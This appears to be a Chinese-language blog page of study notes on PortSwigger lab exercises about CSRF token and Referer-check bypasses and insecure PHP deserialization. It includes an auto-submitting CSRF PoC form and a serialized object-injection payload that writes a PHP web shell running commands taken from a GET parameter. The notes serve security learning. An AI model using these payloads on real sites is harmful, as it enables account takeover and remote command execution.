<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">csrf</span>=R<span class="number">8</span>ov<span class="number">2</span>YBfTYmzFyjit<span class="number">8</span>o<span class="number">2</span>hKBuoIjXXVpa&amp;email=wiener@normal-user.com </span></span><br></pre></td></tr></table></figure>

<p>服务端是怎么验证CSRF token的正确性呢？在Cookie有csrf token；在POST处有csrf token；</p>
<p>验证：the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.查看post提交的csrf token和cookie头中的csrf token是否一致，如果一致则认证通过。</p>
<p>【这种验证方法呢，服务器端是不会维护一个csrf token的，只要这两处的csrf token是一致的就算验证通过。 if the web site contains any cookie setting functionality，那么就可以实施CSRF攻击。下面的例子就是一个存在更改cookie的方法导致csrf漏洞的例子。这一例和上一例修改cookie的方法一致】</p>
<h4 id="001-例子-2"><a href="#001-例子-2" class="headerlink" title="###001 例子"></a>###001 例子</h4><p>已知：wiener:peter</p>
<p>​            update email功能存在csrf漏洞</p>
<p>①先修改两个csrf token，看有没有格式要求，发现得到200，故没有格式要求</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf15.png" alt="csrf15"></p>
<p>②跟上例一样，search得到一个新cookie<img src="D:\blog\H01iday\source_posts\pics\csrf16.png" alt="csrf16"></p>
<p>③通过一样的方法修改cookie 中的csrf token</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf17.png" alt="csrf16"></p>
<p>④在change email页面 右键 engagement tool–&gt;generate CSRF PoC</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf18.png" alt="csrf16"></p>
<p>成功修改email！deliver exploit to victim即可</p>
<h3 id="06-Referer-based-defenses-against-CSRF"><a href="#06-Referer-based-defenses-against-CSRF" class="headerlink" title="##06 Referer-based defenses against CSRF"></a>##06 Referer-based defenses against CSRF</h3><p>some applications make use of the HTTP <code>Referer</code> header to  attempt to defend against CSRF attacks, normally by verifying that the  request originated from the application’s own domain. </p>
<p>即禁止从第三方跳转到application的页面</p>
<h4 id="001-Validation-of-Referer-depends-on-header-being-present"><a href="#001-Validation-of-Referer-depends-on-header-being-present" class="headerlink" title="###001 Validation of Referer depends on header being present"></a>###001 Validation of Referer depends on header being present</h4><p>Some applications validate the <code>Referer</code> header when it is present in requests but skip the validation if the header is omitted.        </p>
<p>这种情况下，可以直接防止浏览器发送referer信息</p>
<p>方法：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="002-Validation-of-Referer-can-be-circumvented"><a href="#002-Validation-of-Referer-can-be-circumvented" class="headerlink" title="###002 Validation of Referer can be circumvented"></a>###002 Validation of Referer can be circumvented</h4><p>Some applications validate the <code>Referer</code> header in a naive way that can be bypassed.</p>
<p>例如：</p>
<p>①application检验referer以规定值开头，则可以将attack的domain作为application合法domain的subdomain</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable-website.com.attacker-website.com/csrf-attack </span><br></pre></td></tr></table></figure>

<p>②simply validates that the <code>Referer</code> contains its own domain name 则可以将application合法domain放在? #等地方来bypass</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker-website.com/csrf-attack?vulnerable-website.com </span><br></pre></td></tr></table></figure>



<p>In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the <code>Referer</code> header by default.            </p>
<p>解决：在http报文头部 添加 <code>Referrer-Policy: unsafe-url</code>，This ensures that the full URL will be sent, including the query string.            </p>
<h5 id="001-例子-3"><a href="#001-例子-3" class="headerlink" title="###001 例子"></a>###001 例子</h5><p>已知: email change 存在CSRF漏洞</p>
<p>​          wiener:peter登录</p>
<p>①拦截 update email</p>
<p>这是正常发送update请求的referer</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf19.png" alt="csrf19"></p>
<p>这是在真正域名中间夹着”hack”,发现400</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf21.png" alt="csrf21"></p>
<p>这是在真正域名前面加了“hack”发现能够得到正确response</p>
<p><img src="D:\blog\H01iday\source_posts\pics\csrf20.png" alt="csrf20"></p>
<p>通过上面标明，这里的validation，只需要在referer有application合法的域名，即可通过验证。</p>
<p>②</p>
<p>这里先说一个js的新函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history.pushState(state, title, url)</span><br></pre></td></tr></table></figure>

<p><strong><code>history.pushState()</code></strong> 方法向当前浏览器会话的历史堆栈中添加一个状态（state）。</p>
<p>statehe title暂时不管 null</p>
<p>url是指定新历史记录条目的URL，新网址必须与当前网址相同 origin； 否则，<code>pushState()</code>将引发异常。</p>
<p>This will cause the Referer header in the generated request to contain the URL of the target site in the query string</p>
<p>我的理解就是，给浏览器添加一条新的历史记录。那么在访问新页面的时候，referer就是这个新历史记录的值。</p>
<p>通过burp suite CSRF PoC generator</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">history.pushState(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;/?ac491f081e2c95afc04c349c000b000f.web-security-academy.net&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!--这里就是从attacker的网页基础上，referer加上application合法domian值，使得验证可以通过--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://ac491f081e2c95afc04c349c000b000f.web-security-academy.net/my-account/change-email&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker6@hack.com&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit request&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>==别忘了在head加上<code>Referrer-Policy: unsafe-url</code>！！！！！！！！==</strong></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/21/insecure%20deserialization/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="H01iday">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2021/10/21/insecure%20deserialization/" class="post-title-link" itemprop="url">Untitled</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>

      <time title="Created: 2021-10-21 11:16:16" itemprop="dateCreated datePublished" datetime="2021-10-21T11:16:16+08:00">2021-10-21</time>
    </span>
      <span class="post-meta-item">
        <span class="post-meta-item-icon">
          <i class="far fa-calendar-check"></i>
        </span>
        <span class="post-meta-item-text">Edited on</span>
        <time title="Modified: 2021-10-22 18:57:55" itemprop="dateModified" datetime="2021-10-22T18:57:55+08:00">2021-10-22</time>
      </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h2 id="01How-to-identify-insecure-deserialization"><a href="#01How-to-identify-insecure-deserialization" class="headerlink" title="#01How to identify insecure deserialization"></a>#01How to identify insecure deserialization</h2><p>通过观察all data being passed into the website的格式。</p>
<p>Serialized data can be identified relatively easily if you know the format that different languages use.</p>
<h3 id="001PHP-serialization-format"><a href="#001PHP-serialization-format" class="headerlink" title="##001PHP serialization format"></a>##001PHP serialization format</h3><h4 id="001例子"><a href="#001例子" class="headerlink" title="####001例子"></a>####001例子</h4><p>一个User对象有以下属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$user-&gt;name = &quot;carlos&quot;;</span><br><span class="line">$user-&gt;isLoggedIn = true;</span><br></pre></td></tr></table></figure>



<p>序列化后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:4:&quot;name&quot;:s:6:&quot;carlos&quot;; s:10:&quot;isLoggedIn&quot;:b:1;&#125; </span><br></pre></td></tr></table></figure>

<ul>
<li><code>O:4:&quot;User&quot;</code> - An object with the 4-character class name <code>&quot;User&quot;</code>         </li>
<li><code>2</code> - the object has 2 attributes         </li>
<li><code>s:4:&quot;name&quot;</code> - The key of the first attribute is the <strong>4</strong>-character <strong>string</strong> <code>&quot;name&quot;</code>         </li>
<li><code>s:6:&quot;carlos&quot;</code> - The value of the first attribute is the <strong>6</strong>-character <strong>string</strong> <code>&quot;carlos&quot;</code>         </li>
<li><code>s:10:&quot;isLoggedIn&quot;</code> - The key of the second attribute is the 10-character string <code>&quot;isLoggedIn&quot;</code>         </li>
<li><code>b:1</code> - The value of the second attribute is the <strong>boolean</strong> value <code>true</code>         </li>
</ul>
<h4 id="002PHP函数"><a href="#002PHP函数" class="headerlink" title="####002PHP函数"></a>####002PHP函数</h4><p><code>serialize()</code>序列化</p>
<p><code>unserialize()</code>反序列化</p>
<h3 id="002Java-serialization-format"><a href="#002Java-serialization-format" class="headerlink" title="##002Java serialization format"></a>##002Java serialization format</h3><h4 id="001说明"><a href="#001说明" class="headerlink" title="###001说明"></a>###001说明</h4><p>Java use binary serialization formats.</p>
<p>但是可以通过一些特殊的符号观察出来是序列化内容</p>
<p>serialized Java objects always begin with the same bytes, which are encoded as <code>ac ed </code>in hexadecimal and <code>rO0</code> in Base64.        </p>
<p>Any class that implements the interface <code>java.io.Serializable</code> can be serialized and deserialized.</p>
<h4 id="Java函数"><a href="#Java函数" class="headerlink" title="###Java函数"></a>###Java函数</h4><p>java.io.ObjectOutputStream类中的**writeObject( )**方法可以实现Java序列化。</p>
<p>java.io.ObjectInputStream类中的**readObject( )**方法可以实现Java反序列化。</p>
<p>想一个Java对象是可序列化的，需要满足相应的要求：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、实现Serializable接口或Externalizable接口</span><br><span class="line">2、当前类提供一个全局常量 serialVersionUID</span><br><span class="line">3、必须保证其内部所有属性也必须是可序列化的（默认情况下，基本数据类型可序列化）</span><br><span class="line">4、ObjectInputStream和ObjectOutputStream不能序列化static和transient修饰的成员变量</span><br></pre></td></tr></table></figure>



<h2 id="02Manipulating-serialized-objects"><a href="#02Manipulating-serialized-objects" class="headerlink" title="#02Manipulating serialized objects"></a>#02Manipulating serialized objects</h2><h3 id="001Modifying-object-attributes"><a href="#001Modifying-object-attributes" class="headerlink" title="##001Modifying object attributes"></a>##001Modifying object attributes</h3><p>consider a website that uses a serialized <code>User</code> object to store data about a user’s session in a cookie.</p>
<p> If an attacker spotted  this <strong>serialized object</strong> in an HTTP request, they might decode it to find  the following byte stream:        </p>
<p> <code>O:4:&quot;User&quot;:2:&#123;s:8:&quot;username&quot;;s:6:&quot;carlos&quot;;s:7:&quot;isAdmin&quot;;b:0;&#125;</code>        </p>
<p>可以看到，<code>isAdmin</code>这个属性是服务器用来判断是否拥有管理员权限的一个值</p>
<p>服务器端会进行如下判断</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$user = unserialize($_COOKIE);                </span><br><span class="line">if ($user-&gt;isAdmin === true) &#123;                </span><br><span class="line">	// allow access to admin interface               </span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>那么通过修改<code>isAdmin</code>属性的值，就可以获取管理员权限</p>
<h4 id="001例子-1"><a href="#001例子-1" class="headerlink" title="###001例子"></a>###001例子</h4><p>已知：普通用户wiener:peter；serialization-based session mechanism</p>
<p>目标：获取管理员权限删除carlos用户信息</p>
<p>①登陆后，查看本用户wiener信息</p>
<p>②这里用到INSPECTOR，可以看出来session为经过base64 encode 的php序列化内容</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id1.png" alt="id1"></p>
<p>③修改admin对应的boolean值为1，Apply changes</p>
<p>④再发送给应用程序，可以进入admin面板，执行管理员操作</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id2.png" alt="id1"></p>
<p><img src="D:\blog\H01iday\source_posts\pics\id3.png" alt="id1"></p>
<h3 id="002Modifying-data-types"><a href="#002Modifying-data-types" class="headerlink" title="##002Modifying data types"></a>##002Modifying data types</h3><h4 id="001PHP‘s-loose-comparison-operator"><a href="#001PHP‘s-loose-comparison-operator" class="headerlink" title="###001PHP‘s loose comparison operator (==)"></a>###001PHP‘s loose comparison operator (<code>==</code>)</h4><p>①<code>A==B</code>两边数据类型不同。</p>
<p>如果A为string，B为Integer，PHP会将A转化为Integer类型再进行比较</p>
<p><code>5 == &quot;5&quot;</code> evaluates to <code>true</code>.        </p>
<p>②A如果为数字开头的字符串,例<code>12abc456</code>，B为Integer</p>
<p>A会先转化为12，后面部分自动忽略，再和B进行比较</p>
<p>③特殊的0</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> == <span class="string">&quot;Example123 string&quot;</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>如果进行比较的字符串不以数字开头，PHP treats this entire string as the integer <code>0</code>.        </p>
<h4 id="002（-）的利用"><a href="#002（-）的利用" class="headerlink" title="###002（==）的利用"></a>###002（<code>==</code>）的利用</h4><p>假设这是服务器端进行密码验证的代码</p>
<p>$password为存储在服务器数据库中的password字符串</p>
<p>$login[‘password’]为从用户浏览器提交过来的cookie中获取的password内容</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$login</span> = unserialize(<span class="variable">$_COOKIE</span>)</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$login</span>[<span class="string">&#x27;password&#x27;</span>] == <span class="variable">$password</span>) &#123;</span><br><span class="line"><span class="comment">// log in successfully</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>假设$password为非数字开头的字符串。</p>
<p>那么我提交的<code>$login[&#39;password&#39;]</code>可以这样操作：修改data type为integer，值为0。</p>
<p>这样，不管$password的内容是什么，只要不是数字开头，<code>$login[&#39;password&#39;] == $password</code>这个检验都能够顺利通过。</p>
<h4 id="003例子"><a href="#003例子" class="headerlink" title="###003例子"></a>###003例子</h4><p>已知：普通用户wiener:peter；serialization-based session mechanism</p>
<p>目的：access the <code>administrator</code> account. Then, delete Carlos.        </p>
<p>①登入账户查看账户信息</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id4.png" alt="id4"></p>
<p>②修改信息，并且apply changes</p>
<p>修改用户名及长度；修改access_token value类型为i值为0</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id5.png" alt="id5"></p>
<p>③发送 得到admin的进入面板</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id6.png" alt="id5"></p>
<h2 id="03Using-application-functionality"><a href="#03Using-application-functionality" class="headerlink" title="#03Using application functionality"></a>#03Using application functionality</h2><p>举个栗子说明：</p>
<p>website’s “Delete user” functionality 让用户可以删除自己的信息</p>
<p>用户信息包含用户头像信息，the user’s profile picture is deleted by accessing the file path in the <code>$user-&gt;image_location</code> attribute.</p>
<p>If this <code>$user</code> was created from a serialized object,那么攻击者可以修改<code>$user-&gt;image_location</code>为任意一个文件A，那么应用程序执行时就会将A以及用户的信息删除。</p>
<p>这就是利用application自身的function来实现attacker的目的</p>
<h3 id="001例子-2"><a href="#001例子-2" class="headerlink" title="##001例子"></a>##001例子</h3><p>已知：用于登录用户信息wiener:peter；serialization-based session mechanism.</p>
<p>目标： delete the <code>morale.txt</code> file from Carlos’s home directory.        </p>
<p>①点击图中delete按钮</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id7.png" alt="id7"></p>
<p>②拦截到如下信息，可以知道avatar_link指向要删除的本用户的头像文件</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id8.png" alt="id7"></p>
<p>③将头像文件路径修改，改为本题要求删除的文件路径，成功删除，且本用户信息也被删除</p>
<p><img src="D:\blog\H01iday\source_posts\pics\id9.png" alt="id7"></p>
<h2 id="04-PHP-Object-Injection"><a href="#04-PHP-Object-Injection" class="headerlink" title="#04 PHP Object Injection"></a>#04 PHP Object Injection</h2><h3 id="001-Magic-Method"><a href="#001-Magic-Method" class="headerlink" title="##001 Magic Method"></a>##001 Magic Method</h3><h4 id="–-wakeup"><a href="#–-wakeup" class="headerlink" title="###– wakeup"></a>###– wakeup</h4><p>执行unserialize()时，先会调用这个函数</p>
<h4 id="–-sleep"><a href="#–-sleep" class="headerlink" title="###– sleep"></a>###– sleep</h4><p>执行serialize()时，先会调用这个函数</p>
<h4 id="–-construct"><a href="#–-construct" class="headerlink" title="###– construct"></a>###– construct</h4><p>构造函数</p>
<h4 id="–-destruct"><a href="#–-destruct" class="headerlink" title="###– destruct"></a>###– destruct</h4><p>在对象消亡之前被调用</p>
<h4 id="–-toString"><a href="#–-toString" class="headerlink" title="###– toString"></a>###– toString</h4><p>allows a class to decide    how it will react when it is treated like a string. </p>
<p>For example,    what <code>echo $obj;</code> </p>
<h4 id="–-call"><a href="#–-call" class="headerlink" title="###– call"></a>###– call</h4><p>在对象中调用一个不可访问方法时，__call()会被调用。   </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MethodTest</span> </span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arguments</span></span>) </span></span><br><span class="line"><span class="function"> //$<span class="title">name</span>为要调用方法的名称，$<span class="title">arguments</span> 参数包含着要传递给方法 $<span class="title">name</span> 的参数。 </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 注意: $name 的值区分大小写</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Calling object method &#x27;<span class="subst">$name</span>&#x27; &quot;</span></span><br><span class="line">             . implode(<span class="string">&#x27;, &#x27;</span>, <span class="variable">$arguments</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> MethodTest;</span><br><span class="line"><span class="variable">$obj</span>-&gt;runTest(<span class="string">&#x27;in object context&#x27;</span>);</span><br><span class="line"><span class="comment">//output:Calling object method &#x27;runTest&#x27; in object context</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="–-serialize"><a href="#–-serialize" class="headerlink" title="###– serialize"></a>###– serialize</h4><p>serialize() 函数会检查类中是否存在一个魔术方法 __serialize()。</p>
<p>如果存在，该方法将在任何序列化之前优先执行。</p>
<p>如果类中同时定义了 __serialize() 和 __sleep() 两个魔术方法，则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。</p>
<h4 id="–-unserialize"><a href="#–-unserialize" class="headerlink" title="###– unserialize"></a>###– unserialize</h4><p>Conversely, unserialize() checks for the presence of a function with the magic name __unserialize(). </p>
<p>如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。 </p>
<h3 id="002PHP-Object-Injection例子"><a href="#002PHP-Object-Injection例子" class="headerlink" title="##002PHP Object Injection例子"></a>##002PHP Object Injection例子</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$logFile</span> = <span class="string">&#x27;logs.txt&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$logData</span> = <span class="string">&#x27;test&#x27;</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkServices</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;[+] Checking Services.&lt;br&gt;&#x27;</span>;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;logData = <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span>-&gt;logFile, <span class="keyword">$this</span>-&gt;logData);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;[+] Logs written to log file.&lt;br&gt;&#x27;</span>;</span><br><span class="line">      <span class="comment">//__DIR__这个是magic parameter。为当前目录绝对路径</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//这个__destruct函数在对象消亡之前会执行</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$userInput</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$someData</span> = unserialize(<span class="variable">$userInput</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$app</span> = <span class="keyword">new</span> App;</span><br><span class="line"><span class="variable">$app</span>-&gt;checkServices();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p>执行index.php 执行结果如下</p>
<img src="D:\blog\H01iday\source\_posts\pics\id10.png" alt="id10" style="zoom:67%;" />

<p>check一下logs.txt是否写入Success</p>
<img src="D:\blog\H01iday\source\_posts\pics\id11.png" alt="id11" style="zoom:67%;" />

<p>ok，说明代码被正确执行</p>
<p>现在进行PHP Object Injection攻击</p>
<p>同一目录下，建立一个test.php文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">App</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logFile</span> = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logData</span> = <span class="string">&#x27;&lt;?php system($_GET[&quot;hacker&quot;])?&gt;&#x27;</span>;</span><br><span class="line">    <span class="comment">//注意 这里我试过似乎只能外层是&#x27;单引号；内层是双引号&quot;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> App;</span><br><span class="line"><span class="keyword">echo</span> htmlspecialchars(serialize(<span class="variable">$obj</span>));<span class="comment">//保证内容被完整地输出</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>



<p><img src="D:\blog\H01iday\source_posts\pics\id12.png" alt="id12"></p>
<p>将<code>O:3:&quot;App&quot;:2:&#123;s:7:&quot;logFile&quot;;s:8:&quot;test.php&quot;;s:7:&quot;logData&quot;;s:31:&quot;&lt;?php system($_GET[&quot;hacker&quot;])?&gt;&quot;;&#125;</code>的内容作为index.php的get data参数</p>
<p>回看到index.php函数可以发现</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$userInput</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>] ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$someData</span> = unserialize(<span class="variable">$userInput</span>);</span><br></pre></td></tr></table></figure>

<p>首先它会被反序列化。反序列化之后其实是一个App类的对象。</p>
<p>则它消亡之前一定会运行__destruct()函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     file_put_contents(<span class="keyword">__DIR__</span> . <span class="string">&#x27;/&#x27;</span> . <span class="keyword">$this</span>-&gt;logFile, <span class="keyword">$this</span>-&gt;logData);</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;[+] Logs written to log file.&lt;br&gt;&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>所以可以从它的运行结果看到 除了原本的两行。多出了第三行。</p>
<p>这一行就是由data反序列化出来的对象执行的__destruct()函数输出的内容</p>
